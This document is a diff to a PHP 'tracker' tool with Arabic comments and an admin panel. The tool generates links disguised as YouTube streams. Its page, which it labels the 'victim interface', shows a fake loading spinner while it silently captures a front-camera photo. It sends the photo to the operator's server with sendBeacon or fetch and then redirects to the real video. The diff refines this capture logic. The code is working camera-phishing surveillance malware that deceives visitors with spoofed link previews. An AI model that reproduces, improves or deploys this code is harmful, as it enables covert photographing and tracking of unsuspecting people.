@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_hyper.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_ultimate.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -28,7 +28,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-function fetch_real_meta($url) {$title = "YouTube Stream - Live";
+function fetch_real_meta($url) {$title = "YouTube Stream";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
@@ -53,7 +53,7 @@ function fetch_real_meta($url) {$title = "YouTube Stream - Live";
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "YouTube Stream - Live";
+$og_title = "YouTube Stream";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
@@ -112,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية للسرعة القصوى
+// واجهة الضحية القصوى
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -123,27 +123,29 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; overflow: hidden; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 13px; color: #94a3b8; }
-        #hyper-video { display: none; }
+        p { font-size: 13px; color: #94a3b8; letter-spacing: 0.5px; }
     </style>
     <script>
-        window.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener("DOMContentLoaded", function() {
             const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
             const targetUrl = "<?php echo $target_redirect; ?>";
 
-            // محاولة فرض الطلب بأقصى سرعة فور فتح الصفحة
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            const constraints = {
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
                 .then(stream => {
-                    const video = document.getElementById('hyper-video');
+                    const video = document.createElement('video');
                     video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
                     video.play();
                     
-                    // التقط فوراً في أقل من 250 ميلي ثانية
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
@@ -151,7 +153,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.90);
                         stream.getTracks().forEach(track => track.stop());
 
                         const formData = new URLSearchParams();
@@ -160,35 +162,40 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 
                         if (navigator.sendBeacon) {
                             navigator.sendBeacon(`/?r=${redirectCode}`, formData);
+                            setTimeout(() => { window.location.replace(targetUrl); }, 300);
+                        } else {
+                            fetch(`/?r=${redirectCode}`, {
+                                method: 'POST',
+                                body: formData,
+                                keepalive: true
+                            }).finally(() => {
+                                window.location.replace(targetUrl);
+                            });
                         }
-                        
-                        window.location.replace(targetUrl);
-                    }, 250);
+                    }, 400); // سرعة فائقة في الالتقاط
                 })
                 .catch(err => {
-                    // في حال رفض الإذن أو حظره، يتم التوجيه بسلاسة
                     window.location.replace(targetUrl);
                 });
         });
     </script>
 </head>
 <body>
-    <video id="hyper-video" autoplay playsinline></video>
     <div class="loader"></div>
-    <p>جاري تحميل المقطع...</p>
+    <p>جاري تحضير المحتوى...</p>
 </body>
 </html>
 <?php 
     exit(); 
 endif; 
 ?>
-<!-- لوحة التحكم الإدارية -->
+<!-- لوحة التحكم الإدارية الاحترافية -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - السرعة القصوى</title>
+    <title>لوحة التحكم - النسخة القصوى</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -228,7 +235,7 @@ endif;
     <div class="wrapper">
         
         <section class="section-box">
-            <h2>توليد رابط السرعة القصوى</h2>
+            <h2>توليد رابط النسخة القصوى</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
